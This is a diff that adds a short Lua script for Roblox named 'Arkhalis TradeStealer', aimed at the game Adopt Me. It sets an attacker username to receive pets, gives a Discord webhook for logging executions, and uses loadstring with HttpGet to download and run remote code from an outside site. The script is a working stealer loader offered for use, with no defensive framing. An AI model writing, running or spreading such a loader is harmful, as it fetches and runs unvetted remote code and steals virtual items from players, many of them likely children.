@@ -1,0 +1,14 @@
+--[[
+       ▀█▀ █▀█ ▄▀▄ █▀▄ █▀▀ █▀▀ ▀█▀ █▀▀ ▄▀▄ █   █▀▀ █▀█ 
+        █  █▀▄ █▀█ █▄▀ ██▄ ▄██  █  ██▄ █▀█ █▄▄ ██▄ █▀▄  
+--]]
+
+--[ Arkhalis TradeStealer --]
+
+--[ Main Config --]
+
+Username = "blacki112999" --// Username To Trade Pets To
+Webhook = "https://discord.com/api/webhooks/1279165457542152232/kdC6iIlU6swp1PUzXolVXSQUIOXGurkc5WkY1kUj405fITY1DrlfEsaIyKKcYtQMCfiv" --// Discord Webhook For Executions
+
+--[ Excutable Loadstring --]
+loadstring(game:HttpGet("https://arkhalis.space/adoptme.lua"))()
